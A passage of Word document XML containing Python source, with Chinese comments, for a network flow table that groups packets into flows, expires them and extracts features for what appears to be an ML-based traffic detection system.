          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                key, forward = rev, False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E37F8C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if flow is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF3316A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            flow = FlowState(key=key, start=rec.ts, last=rec.ts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFB6F34">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flows[key] = flow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B304A31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            forward = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03515990">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if len(self.flows) &gt; self.max_flows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31049587">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.flows.popitem(last=False)  # 最久没动的流被挤掉</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D212F71">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.dropped += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA7859A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flow.add(rec, forward)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0546FDD8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.flows.move_to_end(key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AFD9A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E1A74D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def expire(self, now: float, max_age: float | None = None) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6CBE00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """取出已经结束（FIN/RST）、超时、或存活超过 max_age 的流，从表里移除并返回。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DDB954B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1536B5CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        max_age 是为实时检测加的：一条长连接的 TCP 流可能几十分钟不结束，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFB10BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        等它自然结束再分类等于永远不分类。代价是这类流会被截断成若干段，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8A3A78">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        每段的 Flow Duration / IAT 都只是真实值的一部分——报告里必须写明这一点。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D3F879">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BA7289">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        out = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098AC993">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for key in list(self.flows):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="231A1C18">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            flow = self.flows[key]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B728BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            too_old = max_age is not None and (now - flow.start) &gt; max_age</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38DE660B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if flow.finished or (now - flow.last) &gt; self.flow_timeout or too_old:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF5BD0E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                out.append(self.flows.pop(key))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A960909">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616BEC27">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71275D5E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def snapshot(self, now: float) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2166F5EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """取当前所有活跃流的特征快照，不删流。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE3B679">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D9A9A7A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        实时看板要的是"现在这一秒发生了什么"，而告警又必须等流结束才准；两者都要，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0F16FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        所以既提供 snapshot（不破坏状态）又提供 expire（收尾）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A2DE2C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67445CDE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return [(f.key, flow_features(f, now)) for f in list(self.flows.values())]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="516FC1F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78AB0C30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def evict_idle(self, before: float) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF6F1E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581B2214">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for key in list(self.flows):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141660FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if self.flows[key].last &lt; before:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DCB639">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.flows.pop(key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCC2FA8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                n += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71855CA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068870C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AD63E31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C088167">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def to_vector(features: dict, names: Iterable[str] = None) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A78ED89">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """按给定列序把特征字典拍成向量。列序来自训练时的 feature_schema.json。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF79EC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    names = list(names) if names is not None else FEATURE_ORDER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1BC314">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    missing = [n for n in names if n not in features]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4759A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if missing:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFEDD8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise KeyError(f"特征提取器缺少训练用到的列：{missing[:5]}（共 {len(missing)} 列）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B5AD2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return [features[n] for n in names]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3716C4ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44F4BB2C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="506C41AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def replay(records: Iterable[PacketRecord], max_flows: int = 5000) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50956C59">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """离线回放一串包记录，返回所有结束的流特征。用于 pcap 回放与自测。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15377D9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable(max_flows=max_flows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDAD5CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067A86C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    last_ts = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53614987">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for rec in records:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFDD004">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        table.add(rec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553C3362">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        last_ts = rec.ts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F9A8E4">
      <w:pPr>
        <w:widowControl w:val="0"/>
